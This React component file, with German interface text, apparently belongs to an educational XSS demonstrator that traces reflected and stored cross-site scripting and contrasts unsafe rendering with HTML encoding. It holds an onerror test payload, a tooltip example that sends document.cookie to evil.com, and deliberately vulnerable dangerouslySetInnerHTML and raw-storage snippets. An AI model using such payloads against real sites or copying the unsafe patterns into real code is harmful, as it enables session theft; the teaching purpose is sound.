import { Arrow, TraceBlock } from "@/components/CodeTrace"

// ---------------------------------------------------------------------------
// Payload
// ---------------------------------------------------------------------------

export const XSS_PAYLOAD = `<img src=x onerror="document.dispatchEvent(new CustomEvent('xss-triggered'))">`

// ---------------------------------------------------------------------------
// Interfaces
// ---------------------------------------------------------------------------

export interface ReflectedOutput {
  value: string
  safe: boolean
}

export interface StoredComment {
  id: number
  content: string
  createdAt: string
}

export interface StoredOutput {
  attackerSafe: boolean
  attackerComment: string
  userSafe?: boolean
  userEntries?: StoredComment[]
}

// ---------------------------------------------------------------------------
// ReflectedCodeTrace
// ---------------------------------------------------------------------------

export const DISPLAY_URL = `https://seite.at/suche?q=<img src=x onerror="...">`

export function ReflectedCodeTrace({ output }: { output: ReflectedOutput | null }) {
  if (!output) {
    return (
      <p className="text-xs text-muted-foreground">
        Klicke auf den Link in der E-Mail, um den Code-Ablauf zu sehen.
      </p>
    )
  }

  return (
    <div className="flex flex-col gap-3 text-xs">
      <TraceBlock step="①" label="Manipulierte URL (Angreifer)">
        {DISPLAY_URL}
      </TraceBlock>

      <Arrow />

      <TraceBlock step="②" label="Opfer öffnet Link → Seite liest URL-Parameter">
        {`// React liest den Query-Parameter aus der URL
const [searchParams] = useSearchParams()
const q = searchParams.get("q")
// q = '<img src=x onerror="document.dispatchEvent(...)">'`}
      </TraceBlock>

      <Arrow />

      {/* ③ mit Tooltip */}
      <div className="flex flex-col gap-1">
        <div className="relative group w-fit">
          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
            <span className="mr-1">③</span>dangerouslySetInnerHTML rendert Payload als HTML
          </p>
          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
            <p className="font-semibold mb-1">Warum ist das unsicher?</p>
            <p><code className="bg-muted px-0.5 rounded">dangerouslySetInnerHTML</code> schreibt einen rohen HTML-String direkt in den DOM — ohne Prüfung oder Escapierung. Der Name ist Absicht: React warnt dich damit explizit.</p>
            <p className="mt-1">Der URL-Parameter <code className="bg-muted px-0.5 rounded">q</code> wird direkt als HTML gerendert. Was auch immer in der URL steht, landet 1:1 als echter HTML-Code im Browser.</p>
          </div>
        </div>
        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`// ⚠️ UNSICHER: Parameter wird direkt als HTML gerendert
<div dangerouslySetInnerHTML={{ __html: q }} />

// Gerendert im DOM:
// <div><img src=x onerror="document.dispatchEvent(...)"></div>`}</pre>
      </div>

      <Arrow />

      {/* ④ mit Tooltip */}
      <div className="flex flex-col gap-1">
        <div className="relative group w-fit">
          <p className="text-xs font-semibold text-muted-foreground cursor-help underline decoration-dotted underline-offset-2">
            <span className="mr-1">④</span>Browser führt Script aus
          </p>
          <div className="absolute bottom-full left-0 mb-2 w-80 rounded-md bg-popover border border-border shadow-md px-3 py-2 text-xs text-popover-foreground invisible group-hover:visible z-50 leading-relaxed">
            <p className="font-semibold mb-1">Warum löst das Bild den Angriff aus?</p>
            <p><code className="bg-muted px-0.5 rounded">src="x"</code> existiert nicht — der Ladeversuch schlägt sofort fehl. Genau das ist gewollt: Der <code className="bg-muted px-0.5 rounded">onerror</code>-Handler feuert bei jedem Ladefehler und führt das Schadskript aus.</p>
            <p className="mt-1">Ein echter Angreifer würde statt <code className="bg-muted px-0.5 rounded">dispatchEvent(...)</code> z.B. <code className="bg-muted px-0.5 rounded">{"fetch('https://evil.com?c='+document.cookie)"}</code> einsetzen.</p>
          </div>
        </div>
        <pre className="bg-muted rounded p-2 text-xs overflow-x-auto whitespace-pre-wrap">{`→ <img> wird in den DOM eingefügt.\n   src="x" schlägt fehl → onerror feuert.\n   CustomEvent "xss-triggered" wird dispatched.\n   React Banner: "⚠ XSS erfolgreich!"`}</pre>
      </div>
    </div>
  )
}

// ---------------------------------------------------------------------------
// StoredCodeTrace
// ---------------------------------------------------------------------------

export function StoredCodeTrace({ output }: { output: StoredOutput | null }) {
  if (!output) {
    return (
      <p className="text-xs text-muted-foreground">
        Klicke auf „Sicherer Submit-Button" oder „Unsicherer Submit-Button", um den Code-Ablauf zu
        sehen.
      </p>
    )
  }

  const userDone = output.userSafe !== undefined

  const attackerBackendCode = output.attackerSafe
    ? `// ✅ SICHER: HtmlEncode vor dem Speichern
var sanitized = WebUtility.HtmlEncode(content);
// <  →  &lt;
// >  →  &gt;
// "  →  &quot;
var comment = new Comment(sanitized);
await db.SaveChangesAsync();`
    : `// ⚠️ UNSICHER: Rohinhalt direkt gespeichert
var comment = new Comment(content);
await db.SaveChangesAsync();`

  const dbValue = output.attackerSafe
    ? `&lt;img src=x onerror=&quot;document.dispatchEvent(...)&quot;&gt;`
    : `<img src=x onerror="document.dispatchEvent(new CustomEvent('xss-triggered'))">`

  const renderCode =
    output.userSafe === true
      ? `// ✅ SICHER: React escaped automatisch
entries.map(e => <span>{e.content}</span>)
// → Inhalt wird als plain text angezeigt`
      : `// ⚠️ UNSICHER: dangerouslySetInnerHTML
entries.map(e => (
  <div dangerouslySetInnerHTML={{ __html: e.content }} />
))
// → Inhalt wird als HTML ausgeführt`

  const browserResult =
    output.userSafe === true
      ? `→ Payload wird als Text angezeigt.\n   Kein Event feuert. Kein Schaden.`
      : output.attackerSafe
        ? `→ Kein Schadcode in der DB – hier passiert noch nichts.\n   Der unsichere Render-Pfad (dangerouslySetInnerHTML) ist aber aktiv.\n   Hätte der Angreifer den unsicheren Endpunkt genutzt,\n   wäre der Schadcode für alle Besucher ausgeführt worden.\n   → Das System hat ein Sicherheitsrisiko.`
        : `→ <img> wird in den DOM eingefügt.\n   src="x" schlägt fehl → onerror feuert.\n   CustomEvent "xss-triggered" dispatched.\n   React Banner: "⚠ XSS erfolgreich!" – für ALLE Besucher.`

  return (
    <div className="flex flex-col gap-3 text-xs">
      <TraceBlock
        step="①"
        label={`POST /api/xss/comments-${output.attackerSafe ? "safe" : "unsafe"} (Angreifer)`}
      >
        {`"${output.attackerComment}"`}
      </TraceBlock>

      <Arrow />

      <TraceBlock
        step="②"
        label={output.attackerSafe ? "XssController – sicher" : "XssController – unsicher"}
      >
        {attackerBackendCode}
      </TraceBlock>

      <Arrow />

      <TraceBlock step="③" label="Gespeichert in DB">
        {dbValue}
      </TraceBlock>

      {userDone && (
        <>
          <Arrow />

          <TraceBlock step="④" label="GET /api/xss/comments (Legitimer User lädt Seite)">
            {`// Alle gespeicherten Einträge werden abgerufen\nreturn Ok(await db.Comments.OrderBy(c => c.CreatedAt).ToListAsync());`}
          </TraceBlock>

          <Arrow />

          <TraceBlock
            step="⑤"
            label={
              output.userSafe
                ? "Frontend rendert sicher (JSX)"
                : "Frontend rendert unsicher (dangerouslySetInnerHTML)"
            }
          >
            {renderCode}
          </TraceBlock>

          <Arrow />

          <TraceBlock
            step="⑥"
            label={
              output.userSafe
                ? "Browser zeigt Text – kein Script ausgeführt"
                : output.attackerSafe
                  ? "Kein Script ausgeführt – aber System unsicher"
                  : "Browser führt Script aus"
            }
          >
            {browserResult}
          </TraceBlock>
        </>
      )}
    </div>
  )
}
